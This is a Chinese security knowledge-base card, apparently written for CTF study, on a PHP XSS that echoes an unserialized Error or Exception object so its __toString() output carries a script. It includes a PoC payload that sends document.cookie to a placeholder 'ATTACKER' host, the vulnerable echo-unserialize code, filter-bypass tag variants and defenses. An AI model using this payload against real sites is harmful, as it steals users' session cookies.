---
id: web-php-native-class-error-exception-tostring-xss
title: PHP 原生类 Error/Exception 的 __toString XSS：echo 反序列化对象把 message 注入 HTML 盲打 Cookie
type: scenario
domain: web
path: web/php/deserialization
technique: php-error-exception-native-class-tostring-xss
tags:
- php
- deserialization
- native-class
- error
- exception
- tostring
- xss
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: PHP 7（Error 类）；PHP 5 与 7（Exception 类）
verification:
  verified_by: verifier-V534
  verified_at: '2026-11-11T17:22:38+08:00'
  notes: 已对照原文全文与16张截图逐张核对：原文 Error 类适用 php7、Exception 类适用 php5/7（需开启报错），与卡内 affected_versions 及正文一致；img05/06 为 Error/Exception XSS 弹窗，img07 git 泄露，img08 buuoj 收到 yds=flag{...} Cookie 外带，与 PoC 一致。已修正序列化格式笔误两处：Error 类名 5 字符，O:7:Error 全部改为 O:5:Error（第 44、92 行）。dedup new 成立：同 __toString 原语的 hash-bypass 卡目标是 md5/sha1 强比较加 eval，本卡是 HTML 注入盲打 Cookie，利用目标不同。未执行原文 PoC。
url: /docs/web/php/deserialization/web-php-native-class-error-exception-tostring-xss/
draft: false
kb_aliases:
- PHP 原生类 XSS
- Error XSS
- Exception XSS
- unserialize echo XSS
- BJDCTF xss之光
- 反序列化打 XSS
---

## 一句话结论

当应用把 `unserialize()` 的结果直接 `echo` 输出时，可以传入一个 `Error`（PHP 7）或 `Exception`（PHP 5/7）对象；PHP 会把对象转成字符串，触发其 `__toString()`，返回内容包含攻击者可控的 `message`。把 `<script>` 标签放进 message，即可在响应中执行任意 JS——在 CTF 中常用于盲打管理员 Cookie、把 flag 外带到攻击者服务器。

## 原理

- `Error` 与 `Exception` 都实现了 `__toString()`，返回格式类似 `Error: <message> in <file>:<line>\nStack trace:\n#0 {main}`（`Exception` 同理）。
- `echo` 一个对象时，PHP 自动调用其 `__toString()` 并输出返回字符串。`unserialize()` 可以恢复 `Error`/`Exception` 对象的 `message` 属性（序列化格式为 `O:5:"Error":...` / `O:9:"Exception":...`），攻击者因此能完全控制输出中的 message 段。
- 输出中的 `<script>...</script>` 位于文本前缀之后，浏览器仍会把它当 HTML 标签解析并执行；不需要闭合任何标签，因为 message 直接进入 HTML 响应体。
- 在 CTF 中，flag 往往放在管理员 Cookie 里；用 `document.cookie` 拼接到攻击者 URL 并重定向/发请求，即可外带。由于目标页面可能只被 bot 访问，payload 通常构造为 `<script>window.open("http://attacker/?"+document.cookie)</script>` 或 `new Image().src=...`。
- 版本差异：`Error` 自 PHP 7.0 起可用；`Exception` 在 PHP 5 与 7 均可用，PHP 5 环境下优先用 `Exception`。
- 该手法不依赖 POP 链：只要存在 `echo unserialize($input)`（或 `print`/字符串拼接）即可；与哈希绕过利用的是同一个 `__toString` 原语，但目标从 eval 执行变成浏览器端 JS 执行。

## 触发条件

- 应用存在用户可控的 `unserialize()`，且结果被 `echo`/`print`/字符串拼接直接输出到 HTML 响应。
- 目标 PHP 启用 `Error`（PHP 7+）或 `Exception`（PHP 5/7）。
- 输出未做 HTML 转义；浏览器会解析响应中的 script。
- 若打管理员/机器人，需要 bot 会访问该页面且能访问攻击者外带地址。

## 利用步骤

1. 构造对象：`new Exception('<script>window.open("http://ATTACKER/?"+document.cookie)</script>')`（PHP 5/7）或 `new Error('<script>...</script>')`（PHP 7）。
2. `serialize()` 后按入口要求 URL 编码，作为反序列化参数提交。
3. 页面 `echo unserialize($input)` 触发 `__toString()`，响应中出现 script 标签并在浏览器执行。
4. 攻击者服务器观察收到带 Cookie 的请求，取出 flag。
5. 若 script 被过滤，可换用小写/大小写混合、`<img src=x onerror=...>`、`<svg onload=...>` 等等价执行标签。

## PoC

```php
<?php
$a = new Exception('<script>window.open("http://ATTACKER/?"+document.cookie)</script>');
echo urlencode(serialize($a));
```

目标侧：

```php
<?php
$a = unserialize($_GET['cmd']);
echo $a;   // 触发 Exception::__toString()，message 中的 script 进入响应
```

## 变体与关联

- 变体：PHP 7 用 `Error`，PHP 5 用 `Exception`；两者输出前缀不同但 message 均可控。
- 关联：同一 `__toString` 原语用于绕过 md5/sha1 强比较并 eval 执行，见 `web-php-deserialization-error-exception-tostring-hash-bypass`。
- 关联：其它可被 echo 的原生类（如 `SplFileObject`、目录迭代器）用于读文件/列目录，见 `web-php-deserialization-native-class-array-walk-directory-read`。

## 检测与防御

- 不对不可信输入做 `unserialize`；如必须使用，限制 `allowed_classes` 或做类白名单。
- 输出到 HTML 前统一 HTML 实体编码；不要直接 `echo` 对象/异常。
- 设置 CSP 限制内联脚本与外连；Cookie 加 `HttpOnly` 可降低 `document.cookie` 外带效果（但不能阻止页面内其它 JS 行为）。
- 检测：请求参数中出现 `O:5:"Error"`、`O:9:"Exception"`；响应中出现异常对象的 `Stack trace` 文本；浏览器侧出现异常外连。
